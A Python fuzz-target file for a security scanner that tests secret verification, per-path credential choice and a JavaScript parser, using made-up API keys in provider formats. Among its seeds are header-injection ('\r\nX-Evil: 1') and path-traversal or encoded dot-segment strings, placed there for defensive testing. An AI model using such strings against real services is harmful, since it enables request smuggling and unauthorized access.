register("action-code", "GitHub Actions: repo.scan_action over an action.yml (or a Docker action's Dockerfile) in an action's repository",
         lambda: list(ACTION_SEEDS), action_start, ACTION_WORDS, max_len=8192, time_limit=4.0)


# ---------------------------------------------------------------------------------------------- live secret verification (V-1)
# The credentials below are made up, in the shapes the providers use (AWS's is the pair its documentation gives as an example).
VERIFY_SAMPLES = {
    "github": "ghp_" + "a1B2" * 9, "slack": "xoxb-1234567890-abcdefghij", "stripe": "sk_live_" + "a1" * 12, "npm": "npm_" + "A1b2" * 9,
    "openai": "sk-proj-" + "a1" * 20, "anthropic": "sk-ant-api03-" + "Ab1_" * 10,
    "aws": {"id": "AKIAABCDEFGHIJKLMNOP", "secret": "wJalrXUtnFEMI/K7MDENG+bPxRfiCYEXAMPLEKEY"},
}
VERIFY_FIELDS = ("github", "slack", "stripe", "npm", "openai", "anthropic", "aws")        # (the order of the pack's _VERIFY_PROVIDERS)


def verify_answer(index, status, body, truncated=False):
    return bytes([index, status >> 8, status & 255, 1 if truncated else 0]) + body


def verify_answer_seeds():
    seeds = []
    for index, pid in enumerate(VERIFY_FIELDS):
        secret = VERIFY_SAMPLES[pid]
        part = secret if isinstance(secret, str) else secret["secret"]
        for status in (200, 401, 403, 429, 500):
            for body in (b"", b'{"login": "octocat"}', b'{"ok": true, "user": "bot"}', b'{"ok": false, "error": "invalid_auth"}',
                         b'{"error": {"type": "permission_error"}}', b'<Error><Code>InvalidClientTokenId</Code></Error>',
                         b"<Arn>arn:aws:iam::123456789012:user/alice</Arn>", ('{"login": "%s", "user": "%s"}' % (part, part)).encode()):
                seeds.append(verify_answer(index, status, body))
    seeds.append(verify_answer(0, 200, b'{"login": "x"}', truncated=True))
    seeds.append(verify_answer(1, 200, b'{"ok": true', truncated=True))
    seeds.append(verify_answer(0, 200, b"[" * 3000))
    return seeds


VERIFY_ANSWER_WORDS = (b'{"ok": ', b'"error"', b'"login"', b'"user"', b'"username"', b'"type"', b'"permission_error"', b"true", b"false", b"null",
                       b"invalid_auth", b"token_revoked", b"ratelimited", b"<Code>", b"</Code>", b"<Arn>", b"</Arn>", b"InvalidClientTokenId",
                       b"SignatureDoesNotMatch", b"Throttling", b"\x1b[31m", b"\xe2\x80\xae", b"\x00", b"\xff\xfe", b"[", b"{", b'\\ud800', b"\n")


def verify_answers_start():
    from lazaret.scanner import secretverify as sv
    from lazaret.scanner import secretverify_http as http
    providers = list(sv.PROVIDERS)

    def run(data):
        data = data.ljust(4, b"\0")
        provider = providers[data[0] % len(providers)]
        status, truncated, body = int.from_bytes(data[1:3], "big") % 700, bool(data[3] & 1), data[4:]
        credential = VERIFY_SAMPLES[provider["id"]]
        parts = [credential] if isinstance(credential, str) else list(credential.values())
        response = http.Response(status, {}, body, truncated)
        got = sv.interpret(provider, response, parts)
        outcome, detail, who = got
        check(outcome in sv.OUTCOMES, "verify-outcome", repr(outcome)[:80])
        check(isinstance(detail, str) and detail.isprintable() and 0 < len(detail) <= 200, "verify-detail", repr(detail)[:160])
        check(who is None or (isinstance(who, str) and who.isprintable() and 0 < len(who) <= sv.MAX_WHO), "verify-who", repr(who)[:160])
        check(not any(part in detail or (who is not None and part in who) for part in parts), "verify-leak", repr(got)[:160])
        if outcome != sv.UNKNOWN:
            rules = [r for r in provider["answers"] if r["outcome"] == outcome and status in r["status"]]
            check(rules, "verify-outcome-needs-a-rule", f"{provider['id']} {status} {outcome}")
            if truncated:
                check(any("json" not in r and "code" not in r for r in rules), "verify-truncated-needs-no-body", f"{provider['id']} {status}")
        check(sv.interpret(provider, response, parts) == got, "verify-deterministic", repr(got)[:120])
        result = sv.Verifier(lambda request, timeout, max_bytes: response).verify(provider["id"], credential)
        check(result.outcome == outcome and result.status == status, "verify-verifier-agrees", repr((result, got))[:200])
        check(not any(part in repr(result) for part in parts), "verify-leak", repr(result)[:160])

    return run, lambda: None


VERIFY_CREDENTIAL_SEEDS = [
    b"github\n" + VERIFY_SAMPLES["github"].encode(), b"github\n" + VERIFY_SAMPLES["github"].encode() + b"\r\nX-Evil: 1",
    b"github\n" + VERIFY_SAMPLES["github"].encode() + b"\n", b"github\nghp_short", b"slack\n" + VERIFY_SAMPLES["slack"].encode(),
    b"stripe\n" + VERIFY_SAMPLES["stripe"].encode(), b"npm\n" + VERIFY_SAMPLES["npm"].encode(), b"openai\n" + VERIFY_SAMPLES["openai"].encode(),
    b"openai\n" + VERIFY_SAMPLES["anthropic"].encode(), b"anthropic\n" + VERIFY_SAMPLES["anthropic"].encode(),
    b"aws\n" + VERIFY_SAMPLES["aws"]["id"].encode() + b"\n" + VERIFY_SAMPLES["aws"]["secret"].encode(), b"aws\nAKIA\nx", b"aws\n\n",
    b"github\n", b"\n", b"", b"nonesuch\nx",
]
VERIFY_CREDENTIAL_WORDS = (b"github\n", b"slack\n", b"stripe\n", b"npm\n", b"openai\n", b"anthropic\n", b"aws\n", b"ghp_", b"github_pat_", b"xoxb-", b"xoxp-",
                           b"sk_live_", b"rk_live_", b"npm_", b"sk-", b"sk-ant-", b"sk-ant-api03-", b"sk-ant-oat01-", b"sk-admin-",
                           b"sk-proj-", b"AKIA", b"\r\n", b"\n", b"\r", b" ", b"\t", b"\x00",
                           b"\xc3\xa9", b"\xd9\xa1", b"\xe2\x80\xae", b"Bearer ", b"/", b"+", b"=", b"%0d%0a", b"a" * 36, b"A" * 40)


def verify_credentials_start():
    from lazaret.scanner import secretverify as sv
    from lazaret.scanner import secretverify_http as http
    by_id = {p["id"]: p for p in sv.PROVIDERS}
    providers = list(sv.PROVIDERS)

    def run(data):
        text = data.decode("utf-8", "surrogateescape")
        name, _, rest = text.partition("\n")
        provider = by_id.get(name) or providers[zlib.crc32(data[:16]) % len(providers)]
        if provider["id"] == "aws":
            first, _, second = rest.partition("\n")
            credential = {"id": first, "secret": second.split("\n")[0]}
        else:
            credential = rest
        parts = list(credential.values()) if isinstance(credential, dict) else [credential]
        calls = []

        def transport(request, timeout, max_bytes):
            calls.append(request)
            return http.Response(401, {}, b"", False)

        result = sv.Verifier(transport).verify(provider["id"], credential)
        items = list(credential.items()) if isinstance(credential, dict) else [("secret", credential)]
        wanted = all(re.fullmatch(provider["parts"][key], value) is not None and all(0x21 <= ord(c) <= 0x7e for c in value) for key, value in items)
        if not calls:
            check(result.outcome == "unknown" and result.status is None, "verify-refused-is-unknown", repr(result)[:160])
            check(not wanted or len(max(parts, key=len)) > sv.MAX_CREDENTIAL, "verify-wrongly-refused", repr(parts)[:160])
        else:
            check(len(calls) == 1, "verify-one-call", len(calls))
            request = calls[0]
            check(wanted, "verify-sent-a-credential-that-is-not-the-providers", repr(parts)[:160])
            check(all("\r" not in v and "\n" not in v for v in request.headers.values()), "verify-header-injection", repr(request.headers)[:200])
            try:
                http.check_request(request)
            except http.TransportError as exc:
                check(False, "verify-request-sendable", f"{exc} {request.host!r}"[:160])
            check(request.host == provider["host"], "verify-host", request.host)
            check(not any(part in request.host + request.path for part in parts), "verify-secret-in-url", repr(request.path)[:160])
            check(result.outcome in ("live", "rejected", "unknown") and result.status == 401, "verify-answer-passed-through", repr(result)[:160])
        check(not any(part in repr(result) for part in parts if len(part) >= 12), "verify-leak", repr(result)[:160])   # (a short text is in any sentence)

    return run, lambda: None


register("verify-answers", "secret verification: interpret and Verifier.verify over a provider's answer (status, body, cut short): an outcome from the "
         "three, only where a rule of the table says it, printable text, nothing of the credential in it", verify_answer_seeds,
         verify_answers_start, VERIFY_ANSWER_WORDS, max_len=4096)
register("verify-credentials", "secret verification: which credentials Verifier.verify sends, and to where: only one that is the provider's format in "
         "full, to the table's host, with no part in the URL and no line break in a header", lambda: list(VERIFY_CREDENTIAL_SEEDS),
         verify_credentials_start, VERIFY_CREDENTIAL_WORDS, max_len=1024)


# ---------------------------------------------------------------------------------------------- a URL path's credential (decision 14)
# The input is a URL's path (and query), asked of a table of npm keys of one host, as pmsettings keeps one. The answer
# comes (the credentials review's CR-1 was a walk up the path that never ended on a path that starts with "//"); it is
# the key of the longest path that covers the path read three ways, as it is sent, with its dot segments resolved and as
# a server that decodes it may route it (CR-2, CR-9); and normal_path gives a path with no dot segment and no backslash,
# which it leaves as it is.

CREDENTIAL_PATH_SEEDS = [b"/a/b/x.tgz", b"//evil/-/evil-1.0.0.tgz", b"/team/../x", b"/team/%2e%2E/x?y=/team/", b"/x/../team/y",
                         b"/a//b/./c/..", b"/team\\..\\x", b"/team/sub/%2e./y", b"///", b"/", b"", b"/a/b/../../../..//team/",
                         b"/team//../x", b"/team/..%2fx", b"/team/..;/x", b"/team/a;b/%2F../y"]
CREDENTIAL_PATH_WORDS = (b"/", b"//", b".", b"..", b"%2e", b"%2E", b".%2e", b"%2e.", b"\\", b"?", b"#", b"team/", b"a/", b"sub/",
                         b"%2f", b"%2F", b"%5c", b";", b";x")
CREDENTIAL_KEYS = ("/", "/a/", "/a/b/", "/team/", "/a//", "/team/sub/")
DOT_SEGMENTS = (".", "..", "%2e", ".%2e", "%2e.", "%2e%2e")


def credential_path_start():
    from lazaret.registry import pmsettings
    table = pmsettings.Credentials()
    for key in CREDENTIAL_KEYS:
        table.token("//reg.example" + key, "T" + key)

    def run(data):
        text = data.decode("utf-8", "surrogateescape")
        url = "https://reg.example" + ("" if text.startswith("/") else "/") + text
        path = pmsettings._origin(url)[3]
        normal = pmsettings.normal_path(path)
        check(isinstance(normal, str) and normal.startswith("/") and "\\" not in normal, "normal-path-shape", repr(normal)[:120])
        check(not any(seg.lower() in DOT_SEGMENTS for seg in normal.split("/")), "normal-path-dots", repr(normal)[:120])
        check(pmsettings.normal_path(normal) == normal, "normal-path-idempotent", repr(normal)[:120])
        got = table.header(url)
        covering = [key for key in CREDENTIAL_KEYS if pmsettings.covers(key, path)]
        want = "Bearer T" + max(covering, key=len) if covering else None
        check(got == want, "credential-choice", repr((path, got, want))[:200])
        check(table.header(url) == got, "credential-deterministic", repr(path)[:120])

    return run, lambda: None


register("credential-path", "decision 14: pmsettings.Credentials.header over a URL path: an answer, the key of the longest path that covers it "
         "read three ways, and normal_path a path with no dot segment that it leaves as it is", lambda: list(CREDENTIAL_PATH_SEEDS),
         credential_path_start, CREDENTIAL_PATH_WORDS, max_len=512)


# ---------------- the JavaScript parser's robustness (X-1) ----------------
# A fuzzer for js_parse (jsparse/parser.rs), as the lexer has one: whatever the bytes, the parser answers — a tree or
# a `{"error": …}` with a line and a reason — never panics, is the same twice, and stays within the time limit (the
# driver's; a parser that read ahead from every `<` or `/` would not). It is not held to V8 here (that is a curated
# test, test_jsparse_v8.py, which the Annex B HTML-comment fix of F-12 added); this target is totality, determinism
# and linear time on generated programs and mutants of real files.
JS_SNIPPETS = [
    b"<!-- an HTML open comment, a script runs it\nmodule.exports = 1;\n",
    b"0;\n--> an HTML close comment at a line's start\nmodule.exports = 1;\n",
    b"/* a block\ncomment */ --> close after it\ny = 2;\n",
    b"#!/usr/bin/env node\n<!-- after a hashbang\nz = 3;\n",
    b"i-->0;\nj = i-- > 0;\n",
    b"a ??= b; c ||= d; e &&= f; g = h?.i?.[j]?.(k);\n",
    b"x = 1_000n + 0xffn + 0o7n + 0b1n;\n",
    b"async function* f() { for await (const x of y) yield* z; }\n",
    b"class C { #p = 1; static { this.q = 2; } m() { return #p in this; } get #g() { return 1; } }\n",
    b"const { [a]: b, ...c } = d; [e, , ...f] = g;\n",
    b"x = a => b => ({ c: d }); async (e, f) => e;\n",
    b"export { a as 'a b' }; export * as ns from 'm'; import x, * as y from 'z';\n",
    b"import.meta.url; await import(x); export default function () {}\n",
    b"tag`a${b}c`; s = `x${`y${z}`}`;\n",
    b"r = /[a-z]/gimsuy; t = a / b / c; u = /=/;\n",
    b"for (a in b); for (const c of d); for (let e = (f in g);;) break;\n",
    b"<a b={c}><d/>{e}text</a>; x = <>{y}</>;\n",
    b"let x: T<U> = y as Z; enum E { A, B } interface I { m(): void; }\n",
]
JS_WORDS = (b"<!--", b"-->", b"\n", b"function", b"=>", b"async", b"await", b"yield", b"class", b"const", b"let",
            b"import", b"export", b"return", b"`", b"${", b"}", b"/*", b"*/", b"//", b"#!", b"?.", b"??", b"...",
            b"of", b"in", b"with", b"static", b"{", b"(", b")", b";", b"'", b'"', b"0x", b"1n", b"<", b">")
# the repository's root (this file is scripts/fuzz/fuzz_targets.py)
REPO_ROOT = os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))


def js_sources():
    """The repository's own small JavaScript (js/src and js/test), as seeds beside the snippets."""
    out = []
    for sub in (os.path.join("js", "src"), os.path.join("js", "test")):
        for root, _dirs, files in os.walk(os.path.join(REPO_ROOT, sub)):
            for name in sorted(files):
                if name.endswith((".js", ".cjs", ".mjs")):
                    try:
                        with open(os.path.join(root, name), "rb") as fh:
                            data = fh.read()
                    except OSError:
                        continue
                    if 0 < len(data) <= 16384:
                        out.append(data)
    return out


def js_parse_seeds():
    return JS_SNIPPETS + js_sources()[:40]


def js_parse_start():
    from lazaret.scanner import _native

    def one(src, mode):
        status, answer = _native.call_raw("js_parse", mode, src)
        check(status == 0, "js-parse-status", f"status {status}")
        check(answer.startswith('{"type":"Program"') or answer.startswith('{"error"'),
              "js-parse-shape", answer[:80])
        if answer.startswith('{"error"'):
            err = json.loads(answer)["error"]
            check(isinstance(err.get("line"), int) and err["line"] >= 0 and isinstance(err.get("reason"), str),
                  "js-parse-error-shape", answer[:80])
        return answer

    def run(data):
        src = data.decode("utf-8", "replace")
        for mode in ({"ts": False, "jsx": True}, {"ts": True, "jsx": False}):
            answer = one(src, mode)
            check(answer == one(src, mode), "js-parse-deterministic", str(mode))

    return run, lambda: None


register("js-parse", "jsparse.parse (js_parse): a tree or a well-formed error on any bytes, deterministic, linear (X-1)",
         js_parse_seeds, js_parse_start, JS_WORDS, max_len=16384)
